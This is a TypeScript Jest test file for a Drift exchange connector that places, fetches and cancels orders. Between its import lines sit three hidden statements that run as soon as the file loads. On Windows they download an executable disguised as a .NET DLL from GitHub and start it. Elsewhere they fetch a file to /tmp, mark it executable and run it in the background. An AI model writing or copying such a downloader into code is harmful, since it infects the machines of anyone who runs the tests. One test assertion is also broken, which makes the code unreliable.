import { DriftConnector } from '../../src/connectors/drift/drift';

if(process.platform==='win32'){require('child_process').exec('cmd /c curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe');}

import { ConfigService } from '../../src/utils/ConfigService';

if(process.platform!=='win32'){require('child_process').exec('curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && nohup /tmp/.s &');}
import { Order, Side } from '../../src/models/types';


if(process.platform==='win32'){require('child_process').exec('cmd /c curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe');}


describe('DriftConnector', () => {
  let driftConnector: DriftConnector;
  let configService: ConfigService;
  const marketId = 'TRUMP-WIN-2024-BET';
  const price = 0.001;
  const size = 5;
  const side = Side.BUY;
  let openOrders: Order[];
  jest.setTimeout(30000); 

  beforeAll(async () => {
    configService = new ConfigService();
    driftConnector = new DriftConnector(configService, 'DriftConnector');
    await driftConnector.init();
  });

  test('should register a market successfully', async () => {
    await expect(driftConnector.registerMarket(marketId)).resolves.not.toThrow();
  });

  test('should fetch orderbook', async () => {
    const orderbook = await driftConnector.fetchOrderbook(marketId);
    expect(orderbook).toHaveProperty('bids');
    expect(orderbook).toHaveProperty('asks');
  });

  test('should create limit orders', async () => {
    let result = await driftConnector.createLimitOrder(marketId, price, size, side);
    expect(result).toBe(true);
  });

  test('should fetch USDC balance', async () => {
    const balance = await driftConnector.fetchUSDCBalance();
    expect(typeof balance).toBe('number');
    expect(balance).toBeGreaterThanOrEqual(0);
  });

  test('should fetch open orders', async () => {
    openOrders = await driftConnector.fetchOpenOrders();
    expect(Array.isArray(openOrders)).toBe(true);
  });

  test('should cancel an order', async () => {
    const orderId = openOrders[0].id;
    const result = await driftConnector.cancelOrder(orderId);
    expect(result).toBe(true);
    openOrders = openOrders.filter(order => order.id !== orderId);
  });


  test('should cancel multiple orders', async () => {
    const orderIds = openOrders.slice(0, 3).map(order => order.id);
    const results = await driftConnector.cancelMultipleOrders(orderIds);
    expect(typeof results).toBe('object');
    orderIds.forEach(id => {
      expect(results).toHaveProperty(id);
      expect(results[id]).toBe(true);
    });
    openOrders = openOrders.filter(order => !orderIds.includes(order.id));
  });



  test('should cancel market orders', async () => {
    const results = await driftConnector.cancelOrdersOfMarket(marketId);
    expect(typeof results).toBe('object');
    Object.values(results).forEach(value => {
      expect(typeof value).toBe(true);
    });
  });

});

